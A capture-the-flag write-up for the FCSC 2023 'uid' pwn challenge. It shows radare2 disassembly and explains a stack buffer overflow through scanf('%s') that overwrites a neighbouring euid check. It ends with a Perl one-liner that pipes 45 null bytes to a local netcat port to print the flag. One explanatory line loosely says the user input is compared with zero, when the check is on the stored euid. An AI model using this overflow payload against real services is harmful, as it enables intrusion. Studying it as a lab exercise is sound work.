# URL
https://hackropole.fr/en/challenges/pwn/fcsc2023-pwn-uid/
# Concept
* stack buffer overflow
* variable overwrite
* overwrite to win challenge
# Method of solve
* the first we do is open up the binary in a debugger
```
r2 -d ./uid
aaaa
pdf @ main
```
* this is the disassembly for the program:
```asm
│           0x55cef17b0175      55             push rbp
│           0x55cef17b0176      4889e5         mov rbp, rsp
│           0x55cef17b0179      4883ec30       sub rsp, 0x30
│           0x55cef17b017d      e8cefeffff     call sym.imp.geteuid    ; uid_t geteuid(void)
│           0x55cef17b0182      8945fc         mov dword [var_4h], eax
│           0x55cef17b0185      488d3d780e..   lea rdi, str.username:  ; 0x55cef17b1004 ; "username: "
│           0x55cef17b018c      b800000000     mov eax, 0
│           0x55cef17b0191      e8aafeffff     call sym.imp.printf     ; int printf(const char *format)
│           0x55cef17b0196      488b05b32e..   mov rax, qword [reloc.stdout] ; [0x55cef17b3050:8]=0x7f40b99115c0
│           0x55cef17b019d      4889c7         mov rdi, rax
│           0x55cef17b01a0      e8bbfeffff     call sym.imp.fflush     ; int fflush(FILE *stream)
│           0x55cef17b01a5      488d45d0       lea rax, [var_30h]
│           0x55cef17b01a9      4889c6         mov rsi, rax
│           0x55cef17b01ac      488d3d5c0e..   lea rdi, [0x55cef17b100f] ; "%s"
│           0x55cef17b01b3      b800000000     mov eax, 0
│           0x55cef17b01b8      e8b3feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x55cef17b01bd b    837dfc00       cmp dword [var_4h], 0
│       ┌─< 0x55cef17b01c1      750e           jne 0x55cef17b01d1
│       │   0x55cef17b01c3      488d3d480e..   lea rdi, str.cat_flag.txt ; 0x55cef17b1012 ; "cat flag.txt"
│       │   0x55cef17b01ca      e861feffff     call sym.imp.system     ; int system(const char *string)
│      ┌──< 0x55cef17b01cf      eb0c           jmp 0x55cef17b01dd
│      │└─> 0x55cef17b01d1      488d3d470e..   lea rdi, str.cat_flop.txt ; 0x55cef17b101f ; "cat flop.txt"
│      │    0x55cef17b01d8      e853feffff     call sym.imp.system     ; int system(const char *string)
│      │    ; CODE XREF from main @ 0x55cef17b01cf(x)
│      └──> 0x55cef17b01dd      b800000000     mov eax, 0
│           0x55cef17b01e2      c9             leave
└           0x55cef17b01e3      c3             ret
```
* so essentially, the program takes in user input, then compares the user input with the `0x00` byte
* this is a non-printable character, so we need to use some program, like Python or Perl to input that byte
* we also need to use buffer overflow to overwrite the actual variable being compared
```
cmp dword [var_4h], 0
```
* our user input does not get put into `[var_4h]`, it get put into `[var_30h]`
* so we need to overflow the memory buffer to put a single `0x00` byte into the `[var_4h]` variable and trigger the `cat flag.txt` system function
* the required overflow bytes for this binary is 45, so this Perl command will send the required number:
```
perl -e 'print "\x00" x 45 . "\x0a"' | nc localhost 4000
```
* done

